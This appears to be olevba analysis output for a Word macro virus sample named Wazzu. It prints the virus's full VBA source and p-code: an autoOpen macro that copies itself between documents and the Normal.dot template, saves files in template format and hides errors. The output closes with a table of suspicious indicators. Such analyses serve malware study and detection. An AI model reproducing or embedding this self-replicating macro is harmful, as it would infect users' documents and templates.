olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Wazzu.dl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Wazzu.dl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: ./Virus.MSWord.Wazzu.dl - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
a$ = "autoOpen"
b$ = ":" + a$
gl$ = "Global"
c$ = gl$ + ":" + a$
d$ = "NORMAL" + "." + "DOT"
Dim TheSmallOne$
Dim TheBigOne$
Dim ThisOne$
Dim SmallFileAtt
    On Error GoTo -1: On Error GoTo jane
    
    TheSmallOne$ = WordBasic.[FileName$]() + b$

    TheBigOne$ = c$
    ThisOne$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If ThisOne$ = d$ Then
        SmallFileAtt = GetAttr(WordBasic.[FileName$]())
        If SmallFileAtt >= 32 Then SmallFileAtt = SmallFileAtt - 32
        If SmallFileAtt >= 4 Then SmallFileAtt = SmallFileAtt - 4
        If SmallFileAtt >= 2 Then SmallFileAtt = SmallFileAtt - 2
        If SmallFileAtt = 0 Then
        
            WordBasic.MacroCopy TheBigOne$, TheSmallOne$
            WordBasic.FileSaveAs Format:=1
            WordBasic.SetDocumentDirty 0
        End If
    Else
        WordBasic.MacroCopy TheSmallOne$, TheBigOne$
    End If
    
GoTo oughta_here

jane:

oughta_here:
    On Error GoTo -1: On Error GoTo 0


End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Wazzu.dl
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/autoOpen - 2374 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LitStr 0x0008 "autoOpen"
' 	St a$ 
' Line #3:
' 	LitStr 0x0001 ":"
' 	Ld a$ 
' 	Add 
' 	St B$ 
' Line #4:
' 	LitStr 0x0006 "Global"
' 	St gl$ 
' Line #5:
' 	Ld gl$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld a$ 
' 	Add 
' 	St c$ 
' Line #6:
' 	LitStr 0x0006 "NORMAL"
' 	LitStr 0x0001 "."
' 	Add 
' 	LitStr 0x0003 "DOT"
' 	Add 
' 	St d$ 
' Line #7:
' 	Dim 
' 	VarDefn TheSmallOne
' Line #8:
' 	Dim 
' 	VarDefn TheBigOne
' Line #9:
' 	Dim 
' 	VarDefn ThisOne
' Line #10:
' 	Dim 
' 	VarDefn SmallFileAtt
' Line #11:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError jane 
' Line #12:
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Ld B$ 
' 	Add 
' 	St TheSmallOne$ 
' Line #14:
' Line #15:
' 	Ld c$ 
' 	St TheBigOne$ 
' Line #16:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St ThisOne$ 
' Line #17:
' Line #18:
' 	Ld ThisOne$ 
' 	Ld d$ 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	ArgsLd GetAttr 0x0001 
' 	St SmallFileAtt 
' Line #20:
' 	Ld SmallFileAtt 
' 	LitDI2 0x0020 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld SmallFileAtt 
' 	LitDI2 0x0020 
' 	Sub 
' 	St SmallFileAtt 
' 	EndIf 
' Line #21:
' 	Ld SmallFileAtt 
' 	LitDI2 0x0004 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld SmallFileAtt 
' 	LitDI2 0x0004 
' 	Sub 
' 	St SmallFileAtt 
' 	EndIf 
' Line #22:
' 	Ld SmallFileAtt 
' 	LitDI2 0x0002 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	Ld SmallFileAtt 
' 	LitDI2 0x0002 
' 	Sub 
' 	St SmallFileAtt 
' 	EndIf 
' Line #23:
' 	Ld SmallFileAtt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #24:
' Line #25:
' 	Ld TheBigOne$ 
' 	Ld TheSmallOne$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #27:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentDirty 0x0001 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	ElseBlock 
' Line #30:
' 	Ld TheSmallOne$ 
' 	Ld TheBigOne$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #31:
' 	EndIfBlock 
' Line #32:
' Line #33:
' 	GoTo oughta_here 
' Line #34:
' Line #35:
' 	Label jane 
' Line #36:
' Line #37:
' 	Label oughta_here 
' Line #38:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #39:
' Line #40:
' Line #41:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

